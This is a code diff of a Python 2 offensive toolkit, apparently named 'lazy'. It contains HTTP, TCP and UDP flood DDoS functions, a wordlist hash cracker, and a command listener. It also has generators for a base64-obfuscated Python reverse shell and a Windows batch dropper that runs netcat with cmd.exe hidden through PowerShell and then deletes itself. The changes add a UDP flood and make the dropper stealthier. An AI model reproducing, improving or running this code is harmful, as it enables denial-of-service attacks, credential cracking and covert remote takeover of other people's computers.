@@ -13,11 +13,11 @@ except ImportError:
 	green=''
 	yellow=''
 	white=''
-scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']}
+scs = {'ddos':['flood/http','flood/tcp','flood/udp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']}
 opt1 = ''
 opt2 = ''
 infos = {'flood/http':
-	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/tcp':
+	'Options:\nurl .... target to attack    '+opt1,'flood/tcp':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
 	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
 	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
@@ -33,15 +33,14 @@ def options(script,_opt1,_opt2):
 	else:
 		print '%s[!]%s Please select a script first' %(yellow,white)
 		print 'Ex: "set_script <scriptname>"'
-def floodhttp(host,port):
+def floodhttp(url):
 	import requests, sys
-	url = 'http://'+host+':'+port
 	counter = 0
 	while 1:
 		try:
 			counter += 1
-			requests.get(url)
-			sys.stdout.write('\r%s[+]%s Sending request ' %(green,white) +str(counter)+' to '+host+':'+port)
+			requests.get(url) #// send get request to target
+			sys.stdout.write('\r%s[+]%s Sending request ' %(green,white) +str(counter)+' to '+url)
 		except KeyboardInterrupt:
 			break
 			print ''
@@ -84,7 +83,7 @@ ddos/flood/http:
 [+] Sending request 15300 to google.com:80^C
 >> lazy/ddos/flood/http# back
 >> lazy#\n'''
-	
+
 def floodtcp(host,port):
 	import socket, random, sys
 	port = int(port)
@@ -103,7 +102,7 @@ def floodtcp(host,port):
 				counter +=1
 				msg = random._urandom(1024)
 				s.send(msg)
-				sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port)) 
+				sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port))
 			except KeyboardInterrupt:
 				s.close()
 				break
@@ -138,19 +137,14 @@ def hashkiller(wordl, hash):
 		# verify user input
 		if hashtype == 'md5':
 			crack = hashlib.md5
-
 		if hashtype == 'sha1':
 			crack = hashlib.sha1
-
 		if hashtype == 'sha224':
 			crack = hashlib.sha224
-
 		if hashtype == 'sha256':
 			crack = hashlib.sha256
-
 		if hashtype == 'sha384':
 			crack = hashlib.sha384
-
 		if hashtype == 'sha512':
 			crack = hashlib.sha512
 		# open e read wordlist
@@ -187,7 +181,7 @@ def listener():
 			c, addr = s.accept()
 			print green+'[+]'+white+' Connection from', addr
 			while True:
-				cmd = raw_input('shell# ')
+				cmd = raw_input('lazy@%s$ ' %addr[0])
 				if cmd != '':
 					c.send(cmd)
 					print c.recv(1024) # response
@@ -198,18 +192,18 @@ def listener():
 
 def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 	pth = raw_input('File name (ex: payload.pyw): ')
-	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(1024)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tconn=os.getcwd()\n\t\ts.send(conn)\n\telse:\n\t\tcmd = os.popen(conn).read()\n\t\ts.sendall(cmd+"\\n")'
+	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(2048)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tcmd=""\n\telse:\n\t\tcmd = os.popen(conn).read()\n\ts.sendall(cmd+os.getcwd()+"> ")'
 	if os.path.isdir('output'):
 		pth = 'output/'+pth
 		_file = open(pth, 'w')
 	else:
 		_file = open(pth, 'w')
 	print '%s[*]%s Enconding' %(blue,white)
-	enc = payload.encode('base64').replace('\n','') # encode as base64 
+	enc = payload.encode('base64').replace('\n','') # encode as base64
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
 	_file.close()
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
-	quest = raw_input(blue+'[*]'+white+' Do you wanna start listener right now? ('+green+'y'+white+'/'+red+'n'+white+'): ')
+	quest = raw_input(blue+'[*]'+white+' Do you wanna start listener right now? '+green+'(y/n): '+white)
 	if quest.lower() == 'y':
 		listener()
 	else:
@@ -238,8 +232,7 @@ echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
 echo del nc.exe >> bd.bat
 echo del bd.bat >> bd.bat
 echo exit >> bd.bat
-start /min bd.bat
-timeout 5 > nul
+powershell -W hidden ./bd.bat
 del bd.bat'''
 	if os.path.isdir('output'):
 		pth = 'output/'+pth
@@ -251,7 +244,7 @@ del bd.bat'''
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
 def run(script, opt1, opt2):
 	if script == 'flood/http':
-		floodhttp(opt1,opt2)
+		floodhttp(opt1)
 	if script == 'flood/tcp':
 		floodtcp(opt1,opt2)
 	if script == 'flood/udp':
